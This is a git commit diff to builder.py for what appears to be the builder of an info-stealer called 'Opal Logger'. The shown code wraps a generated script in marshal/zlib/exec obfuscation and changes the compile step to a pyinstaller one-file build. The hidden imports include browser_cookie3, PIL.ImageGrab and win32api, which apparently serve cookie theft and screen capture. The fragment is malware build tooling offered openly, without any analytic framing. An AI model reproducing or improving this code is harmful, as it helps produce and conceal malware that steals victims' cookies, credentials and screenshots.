54c58726fefc8584712f64ebd1830da5c4cebeab
Synthetic <106828424+Syntheticc@users.noreply.github.com>
2022-09-26 15:59:05 -0400

    Update builder.py

--- builder.py
+++ builder.py
@@ -36,7 +36,7 @@ with open(f'{name}.py') as fi:
         f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
     compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_blue, interval=0.01)
     if compile == "y":
-        os.system(f'pyarmor pack -e "--onefile --noconsole " {name}.py')
+        os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="pystyle"  --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3"  --hidden-import="json"  --hidden-import="platform"  --hidden-import="re"  --hidden-import="uuid" --hidden-import="psutil" --hidden-import="psutil"  --hidden-import="win32api" {name}.py')
         os.remove(f'{name}.spec')
         Write.Print("Opal Logger Was SucessFully Complied In Dist Folder\n",Colors.green_to_blue, interval=0.01) 
         time.sleep(2)
